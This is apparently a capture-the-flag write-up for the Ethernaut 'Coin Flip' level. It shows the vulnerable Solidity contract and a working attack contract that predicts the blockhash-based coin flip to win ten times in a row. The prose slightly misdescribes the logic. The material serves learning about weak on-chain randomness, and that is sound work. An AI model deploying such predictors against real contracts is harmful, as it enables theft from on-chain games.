<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel3.svg">

# Target Contract Review

Given conract.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0; 
      return false;
    }
  }
}
```

Challenge's message.
>This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

We have contract which can increase consecutiveWins with be flying blind. To be more precise, in the **_flip()_** function set a variable call **blockValue** help with keeping the hash of the previous block number as uint256. If lasthash doesn't equal to blockValue, lasthash will be blockValue's value. Afterwards, if blockValue equal to FACTOR which is defined in the start, side variable will be true. Other senarious, side variable will be false. Lastly, if our guess is same with side, consecutiveWins **will be increased**.

## Global Variables in Solidity

In solidity, there are some variables which can call from everyone. **_block.number_** is one of them. In this case, we can access to current block number of chain. Thus, we make always **correct guess**. More about [Global Variables](https://docs.soliditylang.org/en/v0.8.17/units-and-global-variables.html#special-variables-and-functions).

# Subverting

My attack contract.
```solidity
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract Attack{

    CoinFlip coinflip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target){
        coinflip = CoinFlip(_target);
    }

    function flip() external{
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint flip = blockValue/FACTOR;
        bool choice  = flip == 1 ? true : false;
        coinflip.flip(choice);
    }

    function showWins() external view returns(uint){
        return coinflip.consecutiveWins();
    }
}
```
Firstly, get our target contract address. Then set blockValue and choice as in target contract. And then send our guess to flip() function in the target contract.

```shell
await contract.address
'0x24Aa95c4f7bf90BAa33ec67698f5ADc64B0DB551'
```
Deploy an attack contract.

<img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Coin%20Flip/img/deploy.png">

And then, call **flip()** function ten times. After tthat, we will passed this challenge.

<img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Coin%20Flip/img/start.png">

<img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Coin%20Flip/img/finished.png">

Ethernaut's message:

>Generating random numbers in solidity can be tricky. There currently isn't a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.
To get cryptographically proven random numbers, you can use Chainlink VRF, which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.
Some other options include using Bitcoin block headers (verified through BTC Relay), RANDAO, or Oraclize).

**_by wasny0ps_**
